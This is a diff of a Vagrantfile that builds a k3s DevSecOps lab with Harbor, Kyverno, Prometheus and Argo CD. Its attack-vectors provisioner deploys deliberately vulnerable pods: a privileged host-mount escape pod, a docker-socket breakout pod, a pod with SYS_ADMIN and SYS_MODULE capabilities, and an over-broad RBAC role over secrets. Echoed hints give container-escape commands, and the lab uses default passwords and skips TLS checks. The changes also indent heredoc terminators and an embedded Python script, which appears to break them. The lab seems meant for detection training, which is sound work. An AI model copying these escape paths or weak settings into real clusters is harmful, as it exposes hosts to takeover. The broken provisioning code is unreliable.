       case cfg[:role]
       when "master"
-        # ============================================================
-        # PORT FORWARDING - Enterprise UI Access
-        # ============================================================
+        # Port forwarding
         vm.vm.network "forwarded_port", guest: 80, host: 8080, host_ip: "127.0.0.1"
         vm.vm.network "forwarded_port", guest: 443, host: 8443, host_ip: "127.0.0.1"
         vm.vm.network "forwarded_port", guest: 6443, host: K8S_API_HOST_PORT.to_i, host_ip: "127.0.0.1"
         vm.vm.network "forwarded_port", guest: 30001, host: 30001, host_ip: "127.0.0.1"
-        # Argo CD UI
         vm.vm.network "forwarded_port", guest: 30003, host: 30003, host_ip: "127.0.0.1"
         vm.vm.network "forwarded_port", guest: 30004, host: 30004, host_ip: "127.0.0.1"
 
-        # ============================================================
+        # ===================================================================
         # PROVISIONER 1: BASE LAB + K3S + HARBOR
-        # ============================================================
+        # ===================================================================
         vm.vm.provision "shell", inline: <<-SHELL
           if [ "${DEBUG:-false}" = "true" ]; then set -x; fi
           set -euo pipefail
@@ -523,13 +709,14 @@ EOF
           INGRESS_NGINX_VERSION="#{INGRESS_NGINX_VERSION}"
           K3S_VERSION="#{K3S_VERSION}"
           DOCKER_VERSION="#{DOCKER_VERSION}"
-          HARBOR_PASS=#{Shellwords.escape(HARBOR_PASS)}
+          HARBOR_PASS=#{Shellwords.escape(harbor_pass)}
           TOKEN_PATH=/vagrant/.k3s_token
           CLUSTER_READY=/vagrant/.cluster_ready
           FAST_BOOT="#{FAST_BOOT}"
           LAB_PROFILE="#{LAB_PROFILE}"
           K8S_API_HOST_PORT="#{K8S_API_HOST_PORT}"
           CACHE_MODE="#{CACHE_MODE}"
+          PROVIDER="#{PROVIDER}"
           AIRGAP_IMAGES=(
 #{AIRGAP_IMAGES.map { |image| "\"#{image}\"" }.join("\n")}
           )
@@ -599,18 +786,18 @@ EOF
           modprobe overlay || true
           modprobe vxlan || true
           cat <<EOF >/etc/modules-load.d/k8s.conf
-overlay
-br_netfilter
-vxlan
-EOF
+        overlay
+        br_netfilter
+        vxlan
+        EOF
           echo br_netfilter | tee /etc/modules-load.d/br_netfilter.conf >/dev/null
           cat <<EOF >/etc/sysctl.d/99-kubernetes.conf
-net.bridge.bridge-nf-call-iptables=1
-net.bridge.bridge-nf-call-ip6tables=1
-net.ipv4.ip_forward=1
-net.ipv4.conf.all.rp_filter=0
-net.ipv4.conf.default.rp_filter=0
-EOF
+        net.bridge.bridge-nf-call-iptables=1
+        net.bridge.bridge-nf-call-ip6tables=1
+        net.ipv4.ip_forward=1
+        net.ipv4.conf.all.rp_filter=0
+        net.ipv4.conf.default.rp_filter=0
+        EOF
           sysctl --system
 
           echo "Configuring iptables for K3s compatibility..."
@@ -639,7 +826,6 @@ EOF
               UBUNTU_VERSION_ID="$(. /etc/os-release && echo "$VERSION_ID")"
               UBUNTU_CODENAME="$(lsb_release -cs)"
               VERSION_STRING_CODENAME="5:${DOCKER_VERSION}-1~ubuntu.${UBUNTU_VERSION_ID}~${UBUNTU_CODENAME}"
-              VERSION_STRING_BROAD="${DOCKER_VERSION}*"
 
               if apt-cache madison docker-ce 2>/dev/null | grep -q "$VERSION_STRING_CODENAME"; then
                 apt-get install -y docker-ce="$VERSION_STRING_CODENAME" docker-ce-cli="$VERSION_STRING_CODENAME" containerd.io docker-buildx-plugin docker-compose-plugin
@@ -656,11 +842,11 @@ EOF
               DOCKER_ACTUAL_VERSION="$(docker --version | cut -d' ' -f3 | tr -d ',')"
 
               cat > /var/lib/docker_installation_record <<EOF
-DESIRED_VERSION=${DOCKER_VERSION}
-ACTUAL_VERSION=${DOCKER_ACTUAL_VERSION}
-INSTALL_METHOD=${DOCKER_INSTALL_METHOD}
-INSTALLED_AT=$(date -Iseconds)
-EOF
+        DESIRED_VERSION=${DOCKER_VERSION}
+        ACTUAL_VERSION=${DOCKER_ACTUAL_VERSION}
+        INSTALL_METHOD=${DOCKER_INSTALL_METHOD}
+        INSTALLED_AT=$(date -Iseconds)
+        EOF
               if [ "${DOCKER_VERSION}" != "${DOCKER_ACTUAL_VERSION}" ] && [ "${FAST_BOOT}" != "true" ]; then
                 echo "WARNING: Docker version drift detected. Continuing anyway."
               fi
@@ -670,23 +856,21 @@ EOF
             RESTART_DOCKER=1
           fi
 
-          # ============================================================
-          # FIX: Docker daemon configuration with multiple insecure registries
-          # ============================================================
+          # Docker daemon configuration
           if [ ! -f /etc/docker/daemon.json ] || [ "$RESTART_DOCKER" -eq 1 ]; then
             cat > /etc/docker/daemon.json <<EOF
-{
-  "storage-driver": "overlay2",
-  "log-driver": "json-file",
-  "log-opts": {"max-size": "10m", "max-file": "3"},
-  "insecure-registries": [
-    "${MASTER_IP}:30001",
-    "quay.io",
-    "ghcr.io",
-    "registry.k8s.io"
-  ]
-}
-EOF
+        {
+          "storage-driver": "overlay2",
+          "log-driver": "json-file",
+          "log-opts": {"max-size": "10m", "max-file": "3"},
+          "insecure-registries": [
+            "${MASTER_IP}:30001",
+            "quay.io",
+            "ghcr.io",
+            "registry.k8s.io"
+          ]
+        }
+        EOF
             RESTART_DOCKER=1
           fi
           [ "$RESTART_DOCKER" -eq 1 ] && systemctl restart docker || true
@@ -767,11 +951,11 @@ EOF
           touch "$CLUSTER_READY"
 
           cat > /vagrant/.cluster_state.json.tmp <<EOF
-{
-  "cluster_ready": true,
-  "master_ip": "${MASTER_IP}"
-}
-EOF
+        {
+          "cluster_ready": true,
+          "master_ip": "${MASTER_IP}"
+        }
+        EOF
           mv /vagrant/.cluster_state.json.tmp /vagrant/.cluster_state.json
 
           wait_for check_kubectl_ready "kubectl API ready" 120
@@ -819,27 +1003,27 @@ EOF
             kubectl create secret tls harbor-tls --cert=harbor.crt --key=harbor.key -n harbor --dry-run=client -o yaml | kubectl apply -f -
 
             cat > /opt/harbor-values.yaml <<EOF
-expose:
-  type: nodePort
-  tls:
-    enabled: true
-    certSource: auto
-    auto:
-      commonName: ${MASTER_IP}
-  nodePort:
-    ports:
-      https:
-        nodePort: 30001
-externalURL: https://${MASTER_IP}:30001
-harborAdminPassword: ${HARBOR_PASS}
-persistence:
-  enabled: true
-  persistentVolumeClaim:
-    registry:
-      size: 5Gi
-trivy:
-  enabled: true
-EOF
+        expose:
+          type: nodePort
+          tls:
+            enabled: true
+            certSource: auto
+            auto:
+              commonName: ${MASTER_IP}
+          nodePort:
+            ports:
+              https:
+                nodePort: 30001
+        externalURL: https://${MASTER_IP}:30001
+        harborAdminPassword: ${HARBOR_PASS}
+        persistence:
+          enabled: true
+          persistentVolumeClaim:
+            registry:
+              size: 5Gi
+        trivy:
+          enabled: true
+        EOF
 
             helm upgrade --install harbor harbor/harbor ${HELM_VERSION_FLAG} -n harbor -f /opt/harbor-values.yaml --wait --timeout 15m || {
               echo "ERROR: Harbor install failed — rolling back"
@@ -866,18 +1050,18 @@ EOF
 
             echo "Reconfiguring Docker daemon to trust Harbor registry..."
             cat > /etc/docker/daemon.json <<EOF
-{
-  "storage-driver": "overlay2",
-  "log-driver": "json-file",
-  "log-opts": {"max-size": "10m", "max-file": "3"},
-  "insecure-registries": [
-    "${MASTER_IP}:30001",
-    "quay.io",
-    "ghcr.io",
-    "registry.k8s.io"
-  ]
-}
-EOF
+        {
+          "storage-driver": "overlay2",
+          "log-driver": "json-file",
+          "log-opts": {"max-size": "10m", "max-file": "3"},
+          "insecure-registries": [
+            "${MASTER_IP}:30001",
+            "quay.io",
+            "ghcr.io",
+            "registry.k8s.io"
+          ]
+        }
+        EOF
             systemctl restart docker
             sleep 10
             echo "Docker daemon reconfigured with Harbor registry"
@@ -959,7 +1143,7 @@ EOF
                 echo " SKIP: Already exists in Harbor"
                 continue
               fi
-              
+
               echo " Pulling (up to 10 attempts)..."
               PULL_SUCCESS=false
               for attempt in 1 2 3 4 5 6 7 8 9 10; do
@@ -970,20 +1154,20 @@ EOF
                 echo " Pull attempt $attempt failed. Retrying in 30 seconds..."
                 sleep 30
               done
-              
+
               if [ "$PULL_SUCCESS" = "false" ]; then
                 echo " WARNING: Pull failed for $img after 10 attempts, skipping"
                 echo " --- Last error log: ---"
                 docker pull "$img" 2>&1 | tail -n 3
                 continue
               fi
-              
+
               echo " Tagging..."
               docker tag "$img" "$target" || {
                 echo " WARNING: Tag failed"
                 continue
               }
-              
+
               echo " Pushing..."
               PUSH_SUCCESS=false
               for attempt in 1 2 3; do
@@ -994,7 +1178,7 @@ EOF
                 echo " Push attempt $attempt failed. Retrying in 10 seconds..."
                 sleep 10
               done
-              
+
               if [ "$PUSH_SUCCESS" = "true" ]; then
                 echo " SUCCESS: $target"
               else
@@ -1014,59 +1198,59 @@ EOF
             export HARBOR_PASS_VAL="${HARBOR_PASS}"
 
             python3 <<'PYEOF'
-import os
-import sys
-import yaml
+        import os
+        import sys
+        import yaml
 
-master_ip   = os.environ.get('MASTER_IP_VAL', '192.168.121.114')
-harbor_proj = os.environ.get('HARBOR_PROJECT_VAL', 'airgap')
-harbor_pass = os.environ.get('HARBOR_PASS_VAL', 'Harbor12345')
+        master_ip   = os.environ.get('MASTER_IP_VAL', '192.168.121.114')
+        harbor_proj = os.environ.get('HARBOR_PROJECT_VAL', 'airgap')
+        harbor_pass = os.environ.get('HARBOR_PASS_VAL', 'Harbor12345')
 
-content = f'''mirrors:
-  "docker.io":
-    endpoint:
-      - "https://{master_ip}:30001"
-    rewrite:
-      "^rancher/(.*)": "{harbor_proj}/rancher/$1"
-      "^library/(.*)": "{harbor_proj}/library/$1"
-      "^(.*)": "{harbor_proj}/$1"
-  "quay.io":
-    endpoint:
-      - "https://{master_ip}:30001"
-    rewrite:
-      "^(.*)": "{harbor_proj}/$1"
-  "ghcr.io":
-    endpoint:
-      - "https://{master_ip}:30001"
-    rewrite:
-      "^kyverno/(.*)": "{harbor_proj}/kyverno/$1"
-      "^(.*)": "{harbor_proj}/$1"
-  "registry.k8s.io":
-    endpoint:
-      - "https://{master_ip}:30001"
-    rewrite:
-      "^(.*)": "{harbor_proj}/$1"
-  "{master_ip}:30001":
-    endpoint:
-      - "https://{master_ip}:30001"
+        content = f'''mirrors:
+          "docker.io":
+            endpoint:
+              - "https://{master_ip}:30001"
+            rewrite:
+              "^rancher/(.*)": "{harbor_proj}/rancher/$1"
+              "^library/(.*)": "{harbor_proj}/library/$1"
+              "^(.*)": "{harbor_proj}/$1"
+          "quay.io":
+            endpoint:
+              - "https://{master_ip}:30001"
+            rewrite:
+              "^(.*)": "{harbor_proj}/$1"
+          "ghcr.io":
+            endpoint:
+              - "https://{master_ip}:30001"
+            rewrite:
+              "^kyverno/(.*)": "{harbor_proj}/kyverno/$1"
+              "^(.*)": "{harbor_proj}/$1"
+          "registry.k8s.io":
+            endpoint:
+              - "https://{master_ip}:30001"
+            rewrite:
+              "^(.*)": "{harbor_proj}/$1"
+          "{master_ip}:30001":
+            endpoint:
+              - "https://{master_ip}:30001"
 
-configs:
-  "{master_ip}:30001":
-    tls:
-      insecure_skip_verify: true
-    auth:
-      username: admin
-      password: {harbor_pass}
-'''
+        configs:
+          "{master_ip}:30001":
+            tls:
+              insecure_skip_verify: true
+            auth:
+              username: admin
+              password: {harbor_pass}
+        '''
 
-with open('/etc/rancher/k3s/registries.yaml', 'w') as f:
-    f.write(content)
+        with open('/etc/rancher/k3s/registries.yaml', 'w') as f:
+            f.write(content)
 
-# Validate YAML
-data = yaml.safe_load(content)
-print('VALID YAML - mirrors:', list(data.get('mirrors', {}).keys()))
-sys.exit(0)
-PYEOF
+        # Validate YAML
+        data = yaml.safe_load(content)
+        print('VALID YAML - mirrors:', list(data.get('mirrors', {}).keys()))
+        sys.exit(0)
+        PYEOF
 
             if [ $? -eq 0 ]; then
               echo "Registries.yaml generated and validated successfully"
@@ -1148,6 +1332,7 @@ PYEOF
           transition_state "base_complete"
           echo "=================================================="
           echo "BASE LAB READY (Profile: ${LAB_PROFILE})"
+          echo "Provider: ${PROVIDER}"
           echo "FAST_BOOT: ${FAST_BOOT}"
           echo "CACHE_MODE: ${CACHE_MODE}"
           echo "Harbor: https://${MASTER_IP}:30001 (admin / ${HARBOR_PASS})"
@@ -1160,7 +1345,9 @@ PYEOF
           exit 0
         SHELL
 
-        # ================= PROVISIONER 2: ENTERPRISE TOOLS =================
+        # ===================================================================
+        # PROVISIONER 2: ENTERPRISE TOOLS
+        # ===================================================================
         vm.vm.provision "shell", inline: <<-SHELL
           if [ "${DEBUG:-false}" = "true" ]; then set -x; fi
           set -euo pipefail
@@ -1182,20 +1369,20 @@ PYEOF
             echo "=========================================="
             echo "INSTALLING TERRAFORM ${TERRAFORM_VERSION}"
             echo "=========================================="
-            
+
             rm -f /usr/local/bin/terraform
             TEMP_DIR=$(mktemp -d)
             cd "$TEMP_DIR"
-            
+
             ARCH=$(uname -m | sed 's/x86_64/amd64/' | sed 's/aarch64/arm64/')
             echo "Detected architecture: ${ARCH}"
-            
+
             curl -fsSL "https://releases.hashicorp.com/terraform/${TERRAFORM_VERSION}/terraform_${TERRAFORM_VERSION}_linux_${ARCH}.zip" -o terraform.zip
             apt-get install -y unzip 2>/dev/null || dnf install -y unzip 2>/dev/null || zypper install -y unzip 2>/dev/null || true
             unzip -q terraform.zip
             mv terraform /usr/local/bin/
             chmod +x /usr/local/bin/terraform
-            
+
             if command -v terraform >/dev/null 2>&1; then
               TERRAFORM_INSTALLED_VERSION=$(terraform version -json 2>/dev/null | grep -o '"terraform_version":"[^"]*"' | cut -d'"' -f4 || terraform version | head -1)
               echo "Terraform installed successfully: ${TERRAFORM_INSTALLED_VERSION}"
@@ -1205,10 +1392,10 @@ PYEOF
               echo "ERROR: Terraform installation failed"
               exit 1
             fi
-            
+
             cd /
             rm -rf "$TEMP_DIR"
-            
+
             echo "=========================================="
           else
             echo "Terraform already installed, skipping (FAST_BOOT=true)"
@@ -1221,20 +1408,20 @@ PYEOF
             echo "=========================================="
             echo "INSTALLING OPENTOFU ${OPENTOFU_VERSION}"
             echo "=========================================="
-            
+
             rm -f /usr/local/bin/tofu
             TEMP_DIR=$(mktemp -d)
             cd "$TEMP_DIR"
-            
+
             ARCH=$(uname -m | sed 's/x86_64/amd64/' | sed 's/aarch64/arm64/')
             echo "Detected architecture: ${ARCH}"
-            
+
             curl -fsSL "https://github.com/opentofu/opentofu/releases/download/v${OPENTOFU_VERSION}/tofu_${OPENTOFU_VERSION}_linux_${ARCH}.zip" -o tofu.zip
             apt-get install -y unzip 2>/dev/null || dnf install -y unzip 2>/dev/null || zypper install -y unzip 2>/dev/null || true
             unzip -q tofu.zip
             mv tofu /usr/local/bin/
             chmod +x /usr/local/bin/tofu
-            
+
             if command -v tofu >/dev/null 2>&1; then
               TOFU_VERSION=$(tofu version -json 2>/dev/null | grep -o '"version":"[^"]*"' | cut -d'"' -f4 || tofu version | head -1)
               echo "OpenTofu installed successfully: ${TOFU_VERSION}"
@@ -1244,10 +1431,10 @@ PYEOF
               echo "ERROR: OpenTofu installation failed"
               exit 1
             fi
-            
+
             cd /
             rm -rf "$TEMP_DIR"
-            
+
             echo "=========================================="
           else
             echo "OpenTofu already installed, skipping (FAST_BOOT=true)"
@@ -1302,10 +1489,10 @@ PYEOF
               helm uninstall kyverno -n kyverno 2>/dev/null || true
               kubectl delete namespace kyverno --ignore-not-found=true
               sleep 10
-              
+
               helm repo add kyverno https://kyverno.github.io/kyverno/ --force-update || true
               helm repo update || true
-              
+
               INSTALL_SUCCESS=false
               for attempt in 1 2 3; do
                 echo "Kyverno install attempt $attempt/3..."
@@ -1325,7 +1512,7 @@ PYEOF
                   sleep 30
                 fi
               done
-              
+
               if [ "$INSTALL_SUCCESS" = "false" ]; then
                 echo "WARNING: Kyverno install had issues - continuing anyway"
                 helm upgrade --install kyverno kyverno/kyverno \
@@ -1383,21 +1570,21 @@ PYEOF
               helm repo update || true
 
               cat > /tmp/prometheus-values.yaml <<EOF
-prometheus:
-  prometheusSpec:
-    serviceMonitorSelectorNilUsesHelmValues: false
-    serviceMonitorSelector: {}
-    serviceMonitorNamespaceSelector: {}
-grafana:
-  adminPassword: admin
-  service:
-    type: NodePort
-  persistence:
-    enabled: true
-    size: 1Gi
-alertmanager:
-  enabled: true
-EOF
+        prometheus:
+          prometheusSpec:
+            serviceMonitorSelectorNilUsesHelmValues: false
+            serviceMonitorSelector: {}
+            serviceMonitorNamespaceSelector: {}
+        grafana:
+          adminPassword: admin
+          service:
+            type: NodePort
+          persistence:
+            enabled: true
+            size: 1Gi
+        alertmanager:
+          enabled: true
+        EOF
 
               helm upgrade --install prometheus-stack prometheus-community/kube-prometheus-stack \
                 --namespace monitoring \
@@ -1443,7 +1630,7 @@ EOF
               kubectl delete crd applications.argoproj.io --ignore-not-found=true --wait=false 2>/dev/null || true
               kubectl delete crd appprojects.argoproj.io --ignore-not-found=true --wait=false 2>/dev/null || true
               kubectl delete crd applicationsets.argoproj.io --ignore-not-found=true --wait=false 2>/dev/null || true
-              
+
               sleep 30
 
               helm repo add argo https://argoproj.github.io/argo-helm --force-update || true
@@ -1516,13 +1703,15 @@ EOF
           touch "$ENTERPRISE_MARKER"
         SHELL
 
-        # ========== PROVISIONER 3: DEVSECOPS ATTACK VECTORS ==========
+        # ===================================================================
+        # PROVISIONER 3: DEVSECOPS ATTACK VECTORS
+        # ===================================================================
         vm.vm.provision "shell", inline: <<-SHELL
           if [ "${DEBUG:-false}" = "true" ]; then set -x; fi
           set -euo pipefail
 
           MASTER_IP="#{cfg[:ip]}"
-          HARBOR_PASS=#{Shellwords.escape(HARBOR_PASS)}
+          HARBOR_PASS=#{Shellwords.escape(harbor_pass)}
           ATTACK_MARKER="/var/lib/devsecops_attack_vectors_installed"
 
           if [ -f "$ATTACK_MARKER" ] && [ "${FAST_BOOT}" = "true" ]; then
@@ -1539,452 +1728,452 @@ EOF
 
           echo "Creating vulnerable namespaces (with privileged policy)..."
           cat <<EOF | kubectl apply -f - || true
----
-apiVersion: v1
-kind: Namespace
-metadata:
-  name: vulnerable
-  labels:
-    security-test: "true"
-    pod-security.kubernetes.io/enforce: privileged
-    pod-security.kubernetes.io/audit: privileged
-    pod-security.kubernetes.io/warn: privileged
----
-apiVersion: v1
-kind: Namespace
-metadata:
-  name: dev
-  labels:
-    security-test: "true"
-    pod-security.kubernetes.io/enforce: privileged
-    pod-security.kubernetes.io/audit: privileged
-    pod-security.kubernetes.io/warn: privileged
----
-apiVersion: v1
-kind: Namespace
-metadata:
-  name: insecure
-  labels:
-    security-test: "true"
-    pod-security.kubernetes.io/enforce: privileged
-    pod-security.kubernetes.io/audit: privileged
-    pod-security.kubernetes.io/warn: privileged
-EOF
+        ---
+        apiVersion: v1
+        kind: Namespace
+        metadata:
+          name: vulnerable
+          labels:
+            security-test: "true"
+            pod-security.kubernetes.io/enforce: privileged
+            pod-security.kubernetes.io/audit: privileged
+            pod-security.kubernetes.io/warn: privileged
+        ---
+        apiVersion: v1
+        kind: Namespace
+        metadata:
+          name: dev
+          labels:
+            security-test: "true"
+            pod-security.kubernetes.io/enforce: privileged
+            pod-security.kubernetes.io/audit: privileged
+            pod-security.kubernetes.io/warn: privileged
+        ---
+        apiVersion: v1
+        kind: Namespace
+        metadata:
+          name: insecure
+          labels:
+            security-test: "true"
+            pod-security.kubernetes.io/enforce: privileged
+            pod-security.kubernetes.io/audit: privileged
+            pod-security.kubernetes.io/warn: privileged
+        EOF
 
           echo "Deploying privileged escape pod..."
           cat <<EOF | kubectl apply -f - || true
----
-apiVersion: v1
-kind: Pod
-metadata:
-  name: privileged-escape
-  namespace: vulnerable
-  labels:
-    security-test: "true"
-    app: escape
-spec:
-  hostNetwork: true
-  hostPID: true
-  hostIPC: true
-  containers:
-  - name: escape
-    image: ubuntu:22.04
-    command: ["/bin/bash", "-c"]
-    args:
-    - |
-      echo "=========================================="
-      echo "PRIVILEGED ESCAPE POD"
-      echo "=========================================="
-      echo ""
-      echo "ATTACK VECTORS:"
-      echo "1. Host filesystem: cd /host && chroot . /bin/bash"
-      echo "2. Process sniffing: ps auxf"
-      echo "3. Network sniffing: tcpdump -i any"
-      echo ""
-      echo "FALCO DETECTION:"
-      echo "- Container with privileged mode"
-      echo "- Container with host mount"
-      echo "- Read sensitive file untrusted"
-      echo ""
-      echo "=========================================="
-      while true; do sleep 60; done
-    securityContext:
-      privileged: true
-      runAsUser: 0
-    volumeMounts:
-    - name: host-root
-      mountPath: /host
-    - name: dev
-      mountPath: /dev
-    - name: proc
-      mountPath: /host/proc
-    - name: sys
-      mountPath: /host/sys
-    - name: cgroup
-      mountPath: /host/sys/fs/cgroup
-    - name: docker-socket
-      mountPath: /host/var/run/docker.sock
-  volumes:
-  - name: host-root
-    hostPath:
-      path: /
-      type: Directory
-  - name: dev
-    hostPath:
-      path: /dev
-  - name: proc
-    hostPath:
-      path: /proc
-  - name: sys
-    hostPath:
-      path: /sys
-  - name: cgroup
-    hostPath:
-      path: /sys/fs/cgroup
-  - name: docker-socket
-    hostPath:
-      path: /var/run/docker.sock
-EOF
+        ---
+        apiVersion: v1
+        kind: Pod
+        metadata:
+          name: privileged-escape
+          namespace: vulnerable
+          labels:
+            security-test: "true"
+            app: escape
+        spec:
+          hostNetwork: true
+          hostPID: true
+          hostIPC: true
+          containers:
+          - name: escape
+            image: ubuntu:22.04
+            command: ["/bin/bash", "-c"]
+            args:
+            - |
+              echo "=========================================="
+              echo "PRIVILEGED ESCAPE POD"
+              echo "=========================================="
+              echo ""
+              echo "ATTACK VECTORS:"
+              echo "1. Host filesystem: cd /host && chroot . /bin/bash"
+              echo "2. Process sniffing: ps auxf"
+              echo "3. Network sniffing: tcpdump -i any"
+              echo ""
+              echo "FALCO DETECTION:"
+              echo "- Container with privileged mode"
+              echo "- Container with host mount"
+              echo "- Read sensitive file untrusted"
+              echo ""
+              echo "=========================================="
+              while true; do sleep 60; done
+            securityContext:
+              privileged: true
+              runAsUser: 0
+            volumeMounts:
+            - name: host-root
+              mountPath: /host
+            - name: dev
+              mountPath: /dev
+            - name: proc
+              mountPath: /host/proc
+            - name: sys
+              mountPath: /host/sys
+            - name: cgroup
+              mountPath: /host/sys/fs/cgroup
+            - name: docker-socket
+              mountPath: /host/var/run/docker.sock
+          volumes:
+          - name: host-root
+            hostPath:
+              path: /
+              type: Directory
+          - name: dev
+            hostPath:
+              path: /dev
+          - name: proc
+            hostPath:
+              path: /proc
+          - name: sys
+            hostPath:
+              path: /sys
+          - name: cgroup
+            hostPath:
+              path: /sys/fs/cgroup
+          - name: docker-socket
+            hostPath:
+              path: /var/run/docker.sock
+        EOF
 
           echo "Deploying docker breakout pod..."
           cat <<EOF | kubectl apply -f - || true
----
-apiVersion: v1
-kind: Pod
-metadata:
-  name: docker-breakout
-  namespace: vulnerable
-  labels:
-    security-test: "true"
-    app: breakout
-spec:
-  containers:
-  - name: docker-client
-    image: docker:latest
-    command: ["/bin/sh", "-c"]
-    args:
-    - |
-      echo "=========================================="
-      echo "DOCKER SOCKET BREAKOUT"
-      echo "=========================================="
-      echo ""
-      echo "ATTACK VECTORS:"
-      echo "1. List containers: docker ps"
-      echo "2. Escape to host: docker run --privileged -v /:/host alpine chroot /host"
-      echo "3. Deploy new containers: docker run -d nginx"
-      echo ""
-      echo "FALCO DETECTION:"
-      echo "- Container with docker socket mount"
-      echo "- Privileged container creation"
-      echo ""
-      echo "=========================================="
-      while true; do sleep 60; done
-    securityContext:
-      privileged: true
-    volumeMounts:
-    - name: docker-socket
-      mountPath: /var/run/docker.sock
-  volumes:
-  - name: docker-socket
-    hostPath:
-      path: /var/run/docker.sock
-EOF
+        ---
+        apiVersion: v1
+        kind: Pod
+        metadata:
+          name: docker-breakout
+          namespace: vulnerable
+          labels:
+            security-test: "true"
+            app: breakout
+        spec:
+          containers:
+          - name: docker-client
+            image: docker:latest
+            command: ["/bin/sh", "-c"]
+            args:
+            - |
+              echo "=========================================="
+              echo "DOCKER SOCKET BREAKOUT"
+              echo "=========================================="
+              echo ""
+              echo "ATTACK VECTORS:"
+              echo "1. List containers: docker ps"
+              echo "2. Escape to host: docker run --privileged -v /:/host alpine chroot /host"
+              echo "3. Deploy new containers: docker run -d nginx"
+              echo ""
+              echo "FALCO DETECTION:"
+              echo "- Container with docker socket mount"
+              echo "- Privileged container creation"
+              echo ""
+              echo "=========================================="
+              while true; do sleep 60; done
+            securityContext:
+              privileged: true
+            volumeMounts:
+            - name: docker-socket
+              mountPath: /var/run/docker.sock
+          volumes:
+          - name: docker-socket
+            hostPath:
+              path: /var/run/docker.sock
+        EOF
 
           echo "Deploying dangerous capabilities pod..."
           cat <<EOF | kubectl apply -f - || true
----
-apiVersion: v1
-kind: Pod
-metadata:
-  name: sys-admin-pod
-  namespace: vulnerable
-  labels:
-    security-test: "true"
-    app: cap
-spec:
-  containers:
-  - name: sys-admin
-    image: ubuntu:22.04
-    command: ["/bin/bash", "-c"]
-    args:
-    - |
-      echo "=========================================="
-      echo "DANGEROUS CAPABILITIES POD"
-      echo "=========================================="
-      echo ""
-      echo "CAPABILITIES GRANTED:"
-      echo "- SYS_ADMIN: Mount filesystems"
-      echo "- SYS_PTRACE: Debug processes"
-      echo "- DAC_READ_SEARCH: Bypass read permissions"
-      echo ""
-      echo "ATTACK VECTORS:"
-      echo "1. Mount proc: mount -t proc none /proc"
-      echo "2. Enter host namespace: nsenter -t 1 -m /bin/bash"
-      echo "3. Ptrace processes: gdb -p 1"
-      echo ""
-      echo "FALCO DETECTION:"
-      echo "- Container with SYS_ADMIN capability"
-      echo "- Process with ptrace system call"
-      echo ""
-      echo "=========================================="
-      while true; do sleep 60; done
-    securityContext:
-      capabilities:
-        add:
-        - SYS_ADMIN
-        - SYS_PTRACE
-        - DAC_READ_SEARCH
-        - SYS_CHROOT
-        - SYS_MODULE
-EOF
+        ---
+        apiVersion: v1
+        kind: Pod
+        metadata:
+          name: sys-admin-pod
+          namespace: vulnerable
+          labels:
+            security-test: "true"
+            app: cap
+        spec:
+          containers:
+          - name: sys-admin
+            image: ubuntu:22.04
+            command: ["/bin/bash", "-c"]
+            args:
+            - |
+              echo "=========================================="
+              echo "DANGEROUS CAPABILITIES POD"
+              echo "=========================================="
+              echo ""
+              echo "CAPABILITIES GRANTED:"
+              echo "- SYS_ADMIN: Mount filesystems"
+              echo "- SYS_PTRACE: Debug processes"
+              echo "- DAC_READ_SEARCH: Bypass read permissions"
+              echo ""
+              echo "ATTACK VECTORS:"
+              echo "1. Mount proc: mount -t proc none /proc"
+              echo "2. Enter host namespace: nsenter -t 1 -m /bin/bash"
+              echo "3. Ptrace processes: gdb -p 1"
+              echo ""
+              echo "FALCO DETECTION:"
+              echo "- Container with SYS_ADMIN capability"
+              echo "- Process with ptrace system call"
+              echo ""
+              echo "=========================================="
+              while true; do sleep 60; done
+            securityContext:
+              capabilities:
+                add:
+                - SYS_ADMIN
+                - SYS_PTRACE
+                - DAC_READ_SEARCH
+                - SYS_CHROOT
+                - SYS_MODULE
+        EOF
 
           echo "Deploying RBAC escalation scenario..."
           cat <<EOF | kubectl apply -f - || true
----
-apiVersion: v1
-kind: ServiceAccount
-metadata:
-  name: dev-user
-  namespace: dev
----
-apiVersion: rbac.authorization.k8s.io/v1
-kind: Role
-metadata:
-  namespace: dev
-  name: pod-exec-role
-rules:
-- apiGroups: [""]
-  resources: ["pods/exec", "pods", "pods/log", "pods/status"]
-  verbs: ["create", "get", "list", "watch", "delete"]
-- apiGroups: [""]
-  resources: ["secrets", "configmaps", "serviceaccounts"]
-  verbs: ["get", "list", "watch", "create", "delete"]
-- apiGroups: [""]
-  resources: ["persistentvolumeclaims", "persistentvolumes"]
-  verbs: ["get", "list", "create", "delete"]
----
-apiVersion: rbac.authorization.k8s.io/v1
-kind: RoleBinding
-metadata:
-  namespace: dev
-  name: dev-user-binding
-subjects:
-- kind: ServiceAccount
-  name: dev-user
-  namespace: dev
-roleRef:
-  kind: Role
-  name: pod-exec-role
-  apiGroup: rbac.authorization.k8s.io
----
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: nginx-dev
-  namespace: dev
-  labels:
-    app: nginx-dev
-spec:
-  replicas: 1
-  selector:
-    matchLabels:
-      app: nginx-dev
-  template:
-    metadata:
-      labels:
-        app: nginx-dev
-    spec:
-      containers:
-      - name: nginx
-        image: nginx:alpine
-        ports:
-        - containerPort: 80
----
-apiVersion: v1
-kind: Service
-metadata:
-  name: nginx-dev
-  namespace: dev
-spec:
-  selector:
-    app: nginx-dev
-  ports:
-  - port: 80
-    targetPort: 80
----
-apiVersion: v1
-kind: Secret
-metadata:
-  name: db-credentials
-  namespace: dev
-type: Opaque
-data:
-  username: ZGJhZG1pbg==
-  password: U3VwZXJTZWNyZXRQYXNzMTIzIQ==
-  host: cG9zdGdyZXMtZGIuZXhhbXBsZS5jb20=
-EOF
+        ---
+        apiVersion: v1
+        kind: ServiceAccount
+        metadata:
+          name: dev-user
+          namespace: dev
+        ---
+        apiVersion: rbac.authorization.k8s.io/v1
+        kind: Role
+        metadata:
+          namespace: dev
+          name: pod-exec-role
+        rules:
+        - apiGroups: [""]
+          resources: ["pods/exec", "pods", "pods/log", "pods/status"]
+          verbs: ["create", "get", "list", "watch", "delete"]
+        - apiGroups: [""]
+          resources: ["secrets", "configmaps", "serviceaccounts"]
+          verbs: ["get", "list", "watch", "create", "delete"]
+        - apiGroups: [""]
+          resources: ["persistentvolumeclaims", "persistentvolumes"]
+          verbs: ["get", "list", "create", "delete"]
+        ---
+        apiVersion: rbac.authorization.k8s.io/v1
+        kind: RoleBinding
+        metadata:
+          namespace: dev
+          name: dev-user-binding
+        subjects:
+        - kind: ServiceAccount
+          name: dev-user
+          namespace: dev
+        roleRef:
+          kind: Role
+          name: pod-exec-role
+          apiGroup: rbac.authorization.k8s.io
+        ---
+        apiVersion: apps/v1
+        kind: Deployment
+        metadata:
